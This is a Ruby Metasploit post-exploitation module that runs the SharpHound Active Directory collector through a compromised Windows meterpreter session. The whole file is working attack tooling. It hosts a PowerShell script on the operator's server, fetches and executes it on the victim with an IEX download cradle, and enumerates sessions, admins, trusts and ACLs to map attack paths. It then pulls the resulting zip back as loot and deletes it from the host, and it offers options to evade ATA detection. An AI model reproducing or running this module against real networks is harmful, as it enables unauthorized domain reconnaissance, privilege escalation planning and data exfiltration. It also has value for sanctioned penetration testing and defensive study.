class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::Remote::HttpServer
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'BloodHound Ingestor',
      'Description'   => %q{
        This module will execute the BloodHound C# Ingestor (aka SharpHound) to gather sessions, local admin, domain trusts and more. With this information BloodHound will easily identify highly complex attack paths that would otherwise be impossible to quickly identify within an Active Directory environment.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'h4ng3r <h4ng3r@computerpirate.me>' ],
      'References'    => [ 'URL', 'https://github.com/BloodHoundAD/BloodHound/' ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'  => [ 'meterpreter' ],
    ))

    register_options([
      OptString.new('CollectionMethod', [ true, 'The collection method to use. This parameter accepts a comma separated list of values. Accepted values are Default, Group, LocalAdmin, RDP, DCOM, GPOLocalGroup, Session, ObjectProps, ComputerOnly, LoggedOn, Trusts, ACL, Container, DcOnly, All', 'Default']),
      OptString.new('Domain', [ false, 'Specifies the domain to enumerate. If not specified, will enumerate the current domain your user context specifies']),
      OptBool.new('SearchForest', [ true, 'Expands data collection to include all domains in the forest.', false]),
      OptBool.new('Stealth', [ true, 'Use stealth collection options, will sacrifice data quality in favor of much reduced network impact', false]),
      OptBool.new('SkipGCDeconfliction', [ true, 'Skips Global Catalog deconfliction during session enumeration. This option can result in more inaccuracy in data.', false]),
      OptBool.new('ExcludeDC', [ true, 'Exclude domain controllers from session queries. Useful for ATA environments which detect this behavior', false]),
      OptString.new('OU', [ false, 'Limit enumeration to this OU. Takes a DistinguishedName.']),
      OptString.new('DomainController', [ false, 'Specify which Domain Controller to request data from. Defaults to closest DC using Site Names']),
      OptInt.new('LdapPort', [ false, 'Override the port used to connect to LDAP']),
      OptBool.new('SecureLdap', [ false, 'Uses LDAPs instead of unencrypted LDAP on port 636']),
      OptBool.new('IgnoreLdapCert', [ true, 'Ignores the certificate for LDAP', false]),
      OptString.new('LDAPUser', [ false, 'User to connect to LDAP with', 'Default']),
      OptString.new('LDAPPass', [ false, 'Password for user you are connecting to LDAP with']),
      OptString.new('DisableKerbSigning', [ false, 'Disables Kerberos Signing on requests.', false]),
      OptInt.new('Threads', [ true, 'Specifies the number of threads to use during enumeration', 10]),
      OptInt.new('PingTimeout', [ true, 'Specifies timeout for ping requests to computers in milliseconds', 250]),
      OptBool.new('SkipPing', [ false, 'Skip all ping checks for computers. This option will most likely be slower as API calls will be made to all computers regardless of being up Use this option if ping is disabled on the network for some reason', false]),
      OptInt.new('LoopDelay', [ true, 'Amount of time to wait between session enumeration loops in minutes. This option should be used in conjunction with the SessionLoop enumeration method.', 300]),
      OptString.new('MaxLoopTime', [ false, 'Length of time to run looped session collection. Format: 0d0h0m0s or any variation of this format. Use in conjunction with -CollectionMethod SessionLoop. Default will loop for two hours']),
    ])

  end

  def on_request_uri(cli, _request)
    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "SharpHound.ps1"))
    send_response(cli, base_script)
  end

  def run
    if not have_powershell?
      fail_with(Failure::Unknown, "PowerShell is not installed")
    end

    start_service()
    uri = get_uri()

    extra_params = ""
    if datastore['Domain']
      extra_params += "-Domain #{datastore['Domain']} "
    end
    if datastore['SearchForest']
      extra_params += "-SearchForest "
    end
    if datastore['Stealth']
      extra_params += "-Stealth "
    end
    if datastore['SkipGCDeconfliction']
      extra_params += "-SkipGCDeconfliction "
    end
    if datastore['ExcludeDC']
      extra_params += "-ExcludeDC "
    end
    if datastore['OU']
      extra_params += "-OU #{datastore['OU']} "
    end
    if datastore['DomainController']
      extra_params += "-DomainController #{datastore['DomainController']} "
    end
    if datastore['LdapPort']
      extra_params += "-LdapPort #{datastore['LdapPort']} "
    end
    if datastore['SecureLdap']
      extra_params += "-SecureLdap "
    end
    if datastore['IgnoreLdapCert']
      extra_params += "-IgnoreLdapCert "
    end
    if datastore['SkipPing']
      extra_params += "-SkipPing "
    end
    if datastore['MaxLoopTime']
      if datastore['MaxLoopTime'] !~ /^[0-9]+[smdh]/i
        raise Msf::OptionValidateError.new(['MaxLoopTime'])
      end
      extra_params += "-MaxLoopTime #{datastore['MaxLoopTime']} "
    end

    tmp_path = get_env('TEMP')
    print_status("Invoking BloodHound with: Invoke-BloodHound -CollectionMethod #{datastore['CollectionMethod']} -Threads #{datastore['Threads']} -JSONFolder \"#{tmp_path}\" -PingTimeout #{datastore['PingTimeout']} -LoopDelay #{datastore['LoopDelay']} #{extra_params}")
    process, _pid, _c = execute_script("IEX (new-object net.webclient).downloadstring('#{uri}'); Invoke-BloodHound -CollectionMethod #{datastore['CollectionMethod']} -Threads #{datastore['Threads']} -JSONFolder \"#{tmp_path}\" -PingTimeout #{datastore['PingTimeout']} -LoopDelay #{datastore['LoopDelay']} #{extra_params}")

    while (line = process.channel.read)
        line.split("\n").map { |s| print_status(s) }
        m = line.match(/Compressing data to (.*\.zip)/)
        sleep 60
        if m
          zip_path = m[1]
          p = store_loot("windows.ad.bloodhound", "application/zip", session, read_file(zip_path), filename=nil, info=nil, service=nil)
          rm_f(zip_path)
          print_good("Downloaded #{zip_path}: #{p.to_s}")
          break
        end
    end

    process.channel.close
    process.close

  end

end
